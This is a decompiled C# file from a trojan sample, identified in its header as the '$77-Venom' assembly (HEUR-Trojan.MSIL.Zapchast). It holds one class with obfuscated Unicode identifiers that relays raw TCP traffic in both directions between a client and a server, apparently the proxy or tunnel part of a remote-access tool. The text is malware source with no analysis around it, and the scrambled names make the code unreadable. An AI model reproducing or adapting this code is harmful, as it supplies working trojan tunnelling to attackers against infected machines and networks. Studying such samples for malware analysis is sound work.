// Decompiled with JetBrains decompiler
// Type: �﫺쑳꺜緝ꒂ՞干蕽톐䌿஥陞㨂穝鑬냕
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Net.Sockets;
using System.Threading;

internal class \uFFFD\uFAFA쑳\uE674꺜緝ꒂ\u055E干蕽톐䌿\u0BA5陞㨂穝\uF4F0\uED86鑬냕
{
  private TcpClient 얟ϩ盧ڠ\uF7C2ᎎ鱢\uF2BB뙻䓨ﻃ\uFFFD綍\uFAE5嚬除恓瘢䚬ᐈ;
  private TcpClient 풬\u9FFE씕側뭱\uFFFD꾀Ī鰊왼춋㭞삉蠅傽ﲲ䐮슓䁭澎;
  private NetworkStream 蜮낤輯䆯쏔\u1B7D漝\u205Eꬠ䗛풾㡵ㆹ\u2A25\uECD6툨䰭㲄鱊ㅾ;
  private NetworkStream \u294D\u2779\uA6F4ዙ堺㯬\uFFFD㓓屹歔鰗縞\uE1DF羲Ἳ红ㅡ쭋厐覲;
  private 쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.\uFFFDⳬﯭ欎旟\uF32Aಗి\u0FF0갩節ﮠ㯨\u1AAD\uF5B6燈䔅뛈魺\u2BB5 樜穠ℌ㝛ﰥꮬ䙡娳Ⱥ\uF338胄\u2733봶ჭꨡ㐄ᅹ犮휲㛛;

  public void \uFFFD氙죁͏\uE427瀜継鼄ꀻ嵼泰\uF259\uF4CA\u20CB幇\uF88C䙫\uF73A복\u2378(
    TcpClient client,
    NetworkStream client_str,
    TcpClient server,
    쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.\uFFFDⳬﯭ欎旟\uF32Aಗి\u0FF0갩節ﮠ㯨\u1AAD\uF5B6燈䔅뛈魺\u2BB5 notify)
  {
    this.얟ϩ盧ڠ\uF7C2ᎎ鱢\uF2BB뙻䓨ﻃ\uFFFD綍\uFAE5嚬除恓瘢䚬ᐈ = client;
    this.풬\u9FFE씕側뭱\uFFFD꾀Ī鰊왼춋㭞삉蠅傽ﲲ䐮슓䁭澎 = server;
    this.蜮낤輯䆯쏔\u1B7D漝\u205Eꬠ䗛풾㡵ㆹ\u2A25\uECD6툨䰭㲄鱊ㅾ = client_str;
    this.\u294D\u2779\uA6F4ዙ堺㯬\uFFFD㓓屹歔鰗縞\uE1DF羲Ἳ红ㅡ쭋厐覲 = server.GetStream();
    this.樜穠ℌ㝛ﰥꮬ䙡娳Ⱥ\uF338胄\u2733봶ჭꨡ㐄ᅹ犮휲㛛 = notify;
    new Thread(new ThreadStart(this.\u0899鸟趙읇솜ᵉꐸ蘃穞攜쥉\uF6F4ᶾ\uF830\uED85\uFFFD\u177C\uF11D욐\uE130)).Start();
    new Thread(new ThreadStart(this.쓀䑾铝글䐈Ḣ뛅囲ᖚῇ䒑礣뎤㵔䬨ዜ푌鄼詤錤)).Start();
  }

  private void \u0899鸟趙읇솜ᵉꐸ蘃穞攜쥉\uF6F4ᶾ\uF830\uED85\uFFFD\u177C\uF11D욐\uE130()
  {
    try
    {
      byte[] buffer = new byte[24577];
      while (쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.襘䲸\u0E8B\u09B5䶆㜶\uFAEDꞌ\uEED8\uE86E\uE5AA\uEB39蕚氂偒匝볮\u2038\u2FC9췐)
      {
        int count = this.蜮낤輯䆯쏔\u1B7D漝\u205Eꬠ䗛풾㡵ㆹ\u2A25\uECD6툨䰭㲄鱊ㅾ.Read(buffer, 0, buffer.Length);
        if (count == 0)
        {
          this.蜮낤輯䆯쏔\u1B7D漝\u205Eꬠ䗛풾㡵ㆹ\u2A25\uECD6툨䰭㲄鱊ㅾ.Close();
          this.얟ϩ盧ڠ\uF7C2ᎎ鱢\uF2BB뙻䓨ﻃ\uFFFD綍\uFAE5嚬除恓瘢䚬ᐈ.Close();
          this.풬\u9FFE씕側뭱\uFFFD꾀Ī鰊왼춋㭞삉蠅傽ﲲ䐮슓䁭澎.Close();
          this.\u294D\u2779\uA6F4ዙ堺㯬\uFFFD㓓屹歔鰗縞\uE1DF羲Ἳ红ㅡ쭋厐覲.Close();
          break;
        }
        this.\u294D\u2779\uA6F4ዙ堺㯬\uFFFD㓓屹歔鰗縞\uE1DF羲Ἳ红ㅡ쭋厐覲.Write(buffer, 0, count);
        this.\u294D\u2779\uA6F4ዙ堺㯬\uFFFD㓓屹歔鰗縞\uE1DF羲Ἳ红ㅡ쭋厐覲.Flush();
      }
    }
    catch (Exception ex)
    {
      this.얟ϩ盧ڠ\uF7C2ᎎ鱢\uF2BB뙻䓨ﻃ\uFFFD綍\uFAE5嚬除恓瘢䚬ᐈ.Close();
      this.풬\u9FFE씕側뭱\uFFFD꾀Ī鰊왼춋㭞삉蠅傽ﲲ䐮슓䁭澎.Close();
    }
  }

  private void 쓀䑾铝글䐈Ḣ뛅囲ᖚῇ䒑礣뎤㵔䬨ዜ푌鄼詤錤()
  {
    try
    {
      byte[] buffer = new byte[24577];
      while (쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.襘䲸\u0E8B\u09B5䶆㜶\uFAEDꞌ\uEED8\uE86E\uE5AA\uEB39蕚氂偒匝볮\u2038\u2FC9췐)
      {
        int count = this.\u294D\u2779\uA6F4ዙ堺㯬\uFFFD㓓屹歔鰗縞\uE1DF羲Ἳ红ㅡ쭋厐覲.Read(buffer, 0, buffer.Length);
        if (count == 0)
        {
          this.蜮낤輯䆯쏔\u1B7D漝\u205Eꬠ䗛풾㡵ㆹ\u2A25\uECD6툨䰭㲄鱊ㅾ.Close();
          this.얟ϩ盧ڠ\uF7C2ᎎ鱢\uF2BB뙻䓨ﻃ\uFFFD綍\uFAE5嚬除恓瘢䚬ᐈ.Close();
          this.풬\u9FFE씕側뭱\uFFFD꾀Ī鰊왼춋㭞삉蠅傽ﲲ䐮슓䁭澎.Close();
          this.\u294D\u2779\uA6F4ዙ堺㯬\uFFFD㓓屹歔鰗縞\uE1DF羲Ἳ红ㅡ쭋厐覲.Close();
          break;
        }
        this.蜮낤輯䆯쏔\u1B7D漝\u205Eꬠ䗛풾㡵ㆹ\u2A25\uECD6툨䰭㲄鱊ㅾ.Write(buffer, 0, count);
        this.蜮낤輯䆯쏔\u1B7D漝\u205Eꬠ䗛풾㡵ㆹ\u2A25\uECD6툨䰭㲄鱊ㅾ.Flush();
      }
    }
    catch (Exception ex)
    {
      this.얟ϩ盧ڠ\uF7C2ᎎ鱢\uF2BB뙻䓨ﻃ\uFFFD綍\uFAE5嚬除恓瘢䚬ᐈ.Close();
      this.풬\u9FFE씕側뭱\uFFFD꾀Ī鰊왼춋㭞삉蠅傽ﲲ䐮슓䁭澎.Close();
    }
  }
}
